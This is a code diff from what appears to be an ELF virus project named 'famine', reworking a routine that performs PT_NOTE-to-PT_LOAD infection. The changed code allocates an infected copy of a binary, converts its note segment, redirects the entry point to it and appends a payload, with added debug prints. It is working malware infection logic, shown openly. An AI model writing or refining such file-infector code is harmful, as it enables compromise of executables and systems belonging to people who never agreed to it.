@@ -31,23 +31,26 @@ void update_note_segment(t_famine *famine)
 
 void pt_note_to_pt_load_infection(t_famine *famine)
 {
-    if (DEBUG == true)
-        printf("Applying pt_note_to_pt_load infection.\n");
     t_elf_phdr segment;
     bool p_data_found = false;
     bool p_note_found = false;
+
+    if (DEBUG == true)
+        printf("Applying pt_note_to_pt_load infection.\n");
     // Create the output file
-    if (!(famine->infected_file = malloc(famine->binary_data_size + PAGE_SIZE)))
+    if (!(famine->infected_file = malloc(famine->binary_data_size + famine->payload_size)))
     {
         error(ERROR_MALLOC, famine);
     }
-    famine->infected_file_size = famine->binary_data_size + PAGE_SIZE;
+    famine->infected_file_size = famine->binary_data_size + famine->payload_size;
 
     for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
     {
         segment = famine->phdr[i];
+        printf("segment offset = %lu\n", segment.p_offset);
         if (is_data_segment(segment) == true)
         {
+            printf("data\n");
             p_data_found = true;
             famine->p_data = segment;
             famine->p_data_end_offset = famine->p_data.p_offset + famine->p_data.p_filesz;
@@ -64,16 +67,19 @@ void pt_note_to_pt_load_infection(t_famine *famine)
         error(ERROR_SECTION_NOT_FOUND, famine);
     }
 
+    printf("famine->p_note.p_offset %lu\n", famine->p_note.p_offset);
+
+    update_note_segment(famine);
+
+    printf("famine->p_note.p_offset %lu\n", famine->p_note.p_offset);
+
     famine->ehdr->e_entry = famine->p_note.p_vaddr;
     famine->new_entry_point = famine->ehdr->e_entry;
 
-    famine->ehdr->e_shoff += famine->payload_size + (famine->p_note.p_offset - famine->p_data_end_offset);
-    update_note_segment(famine);
+    famine->ehdr->e_shoff += famine->payload_size + (famine->p_note.p_offset - (famine->p_data.p_offset + famine->p_data.p_filesz));
 
-    // Copy until end of data section.
-    memcpy(famine->infected_file, famine->mmap_ptr, famine->p_data_end_offset);
+    // Copy until end of original file.
+    memcpy(famine->infected_file, famine->mmap_ptr, famine->binary_data_size);
     // Copy payload.
-    memcpy(famine->infected_file + famine->p_data_end_offset, famine->payload_data, famine->payload_size);
-    // Copy the rest of the binary.
-    memcpy(famine->infected_file + famine->p_data_end_offset + famine->payload_size, famine->mmap_ptr + famine->p_data_end_offset, famine->binary_data_size - famine->p_data_end_offset);
+    memcpy(famine->infected_file + famine->binary_data_size, famine->payload_data, famine->payload_size);
 }
